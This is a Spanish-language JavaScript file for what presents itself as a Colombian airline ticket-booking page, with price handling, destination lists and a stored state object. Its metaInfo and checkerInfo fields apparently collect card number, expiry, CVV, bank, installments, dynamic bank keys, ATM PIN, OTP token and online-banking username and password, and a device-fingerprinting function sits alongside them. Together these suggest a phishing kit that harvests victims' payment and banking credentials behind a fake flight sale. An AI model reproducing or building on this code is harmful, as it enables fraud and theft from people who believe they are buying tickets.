/**
 * CONFIGURACIÓN
 */
// const API_URL = 'https://d9o2bj036p7mb.cloudfront.net'; // Cambiar según convenga.
function saveTicketPrice(price, isReturn) {
  // Normaliza a entero en COP (ej: "49.900" -> 49900, "57,600" -> 57600)
  const toInt = v => {
    if (typeof v === 'number') return Math.round(v);
    if (typeof v === 'string') return parseInt(v.replace(/[^\d]/g, ''), 10) || 0;
    return 0;
  };

  const p = toInt(price);

  /* ----------------- Compatibilidad con tu lógica previa (localStorage) ----------------- */
  if (isReturn) {
    localStorage.setItem('returnFlightPrice', p);
  } else {
    localStorage.setItem('outboundFlightPrice', p);
  }

  const idaLS    = toInt(localStorage.getItem('outboundFlightPrice') || 0);
  const vueltaLS = toInt(localStorage.getItem('returnFlightPrice')  || 0);
  const totalLS  = idaLS + vueltaLS;
  localStorage.setItem('totalPrice', totalLS); // sin decimales, son COP

  /* ----------------- Nuevo: guardar todo centralizado en sessionStorage ----------------- */
  const raw  = sessionStorage.getItem('totalsCOP');
  const data = raw ? JSON.parse(raw) : { ida: 0, vuelta: 0, tasas: 0, total: 0 };

  if (isReturn) {
    data.vuelta = p;
  } else {
    data.ida = p;
  }

  data.total = (toInt(data.ida) + toInt(data.vuelta) + toInt(data.tasas));
  sessionStorage.setItem('totalsCOP', JSON.stringify(data));
}

const API_URL = 'https://dinylb72dk9ak.cloudfront.net'; // Cambiar según convenga.

const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const countries = [
    {
        regionName: "America del Norte",
        costRange: [750, 1100],
        countries: [
            "Canadá",
            "Estados Unidos",
            "México"
        ]
    },
    {
        regionName: "America Central y el Caribe",
        costRange: [550, 850],
        countries: [
            "Belice",
            "Costa Rica",
            "El Salvador",
            "Guatemala",
            "Honduras",
            "Nicaragua",
            "Panamá",
            "Aruba",
            "Barbados",
            "Cuba",
            "Curazao",
            "Puerto Rico",
            "República Dominicana"
        ]
    },
    {
        regionName: "America del Sur",
        costRange: [550, 850],
        countries: [
            "Argentina",
            "Bolivia",
            "Brasil",
            "Chile",
            "Ecuador",
            "Paraguay",
            "Perú",
            "Uruguay",
            "Venezuela"
        ]
    },
    {
        regionName: "Europa y otros",
        costRange: [1300, 1900],
        countries: [
            "España",
            "Reino Unido",
            "Alemania"
        ]
    }

];
    
const pricesNAC = {
    flight_1:{
        xs: 49900,
        s: 1715,
        m: 1912,
    },
    flight_2:{
        xs: 49900,
        s: 1715,
        m: 1912,
    },
    flight_3:{
        xs: 1195,
        s: 1715,
        m: 1912,
    } 
};

const pricesINT = {
    flight_1:{
        xs: 1195,
        s: 1715,
        m: 1912,
    },
    flight_2:{
        xs: 1195,
        s: 1715,
        m: 1912,
    },
    flight_3:{
        xs: 1195,
        s: 1715,
        m: 1912,
    }
};
      
let info = {
    flightInfo:{
        type: 1,
        ticket: false,
        origin: {
            city: "Bogotá (BOG)",
            country: "Colombia",
            code: "Col"
        },
        destination: {
            
        },
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0],
        ticket_nat: false,
        ticket_sched: false,
        ticket_type: false,

    },
    passengersInfo:{
        adults: [],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}


LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

